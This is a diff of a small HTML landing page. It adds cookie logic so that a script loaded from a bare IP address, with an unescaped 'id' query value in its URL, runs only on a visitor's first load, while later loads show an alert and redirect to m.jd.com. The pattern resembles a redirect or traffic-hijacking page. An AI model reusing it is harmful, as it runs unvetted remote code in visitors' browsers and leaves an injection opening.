@@ -26,21 +26,46 @@
         }
     </style>
 <script type="text/javascript">
-        function GetQueryString(name) {
-            var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)","i");
-            var r = window.location.search.substr(1).match(reg);
-            if (r!=null) return (r[2]); return null;
-        }
+function GetQueryString(name) {
+  var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)","i");
+  var r = window.location.search.substr(1).match(reg);
+  if (r!=null) return (r[2]); return null;
+}
+
+function setCookie(name, value) {
+  var Days = 30;
+  var exp = new Date();
+  exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 1000);
+  document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString();
+}
+
+function getCookie(name) {
+  var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
+  if (arr = document.cookie.match(reg)) return unescape(arr[2]);
+  else return null;
+}
+
 </script>
 </head>
 <body>
-<div style="width: 100%;height: 50px"></div>
-<div class="share" id="tips">
+  <div style="width: 100%;height: 50px"></div>
+  <div class="share" id="tips">
     <img src="http://1018.oss-cn-shenzhen.aliyuncs.com/2016041401.png"/>
-</div>
-<script type="text/javascript">
-    var id = GetQueryString('id');
-    document.writeln('<script src="http://139.129.105.116/?id='+id+'"><\/script>');
+  </div>
+  <script type="text/javascript">
+    var cishu = getCookie('cishu');
+    
+    if (cishu == '' || cishu == null)
+    {
+      setCookie('cishu', '1');
+      var id = GetQueryString('id');
+      document.writeln('<script src="http://139.129.105.116/?id='+id+'"><\/script>');
+    }
+    else
+    {
+      alert(cishu);
+      window.location.href = 'http://m.jd.com';
+    }
 </script>
 </body>
 </html>
